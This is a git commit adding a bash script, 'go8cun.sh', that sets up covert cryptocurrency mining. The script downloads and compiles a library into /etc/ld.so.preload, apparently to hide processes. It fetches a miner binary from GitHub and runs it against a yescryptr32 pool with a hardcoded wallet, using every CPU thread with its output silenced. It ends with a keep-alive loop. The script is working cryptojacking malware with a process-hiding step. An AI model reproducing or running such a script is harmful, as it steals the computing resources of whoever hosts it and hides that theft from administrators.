3e09eb61716776102b4b47f59e02f266f654d05d
barburonjilo <barburonjilo@outlook.co.id>
2024-06-10 09:47:32 +0700

    Create go8cun.sh

---
+++ go8cun.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo wget cpulimit -y
+curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+mkdir .lib && cd .lib
+# https://github.com/Sazfa-Kuy/ocvminer/raw/main/maker
+# https://github.com/TiannaMcdowell/All-File/raw/main/sereb plant
+# https://github.com/barburonjilo/back/raw/main/sr srb
+
+wget -O sgr1  https://github.com/barburonjilo/back/raw/main/sr 
+chmod +x sgr1
+cpulimit -l 1200 -e sgr1 &
+# sudo sync && sudo echo 3 > /proc/sys/vm/drop_caches
+# nice -n -10 nohup ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.envio --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
+./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$(echo $RANDOM | md5sum | head -c 5) --password x --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1  &
+# ./sgr1 --algorithm yescryptr32 --pool stratum-asia.rplant.xyz:17116 --wallet UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.solo --password m=solo --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
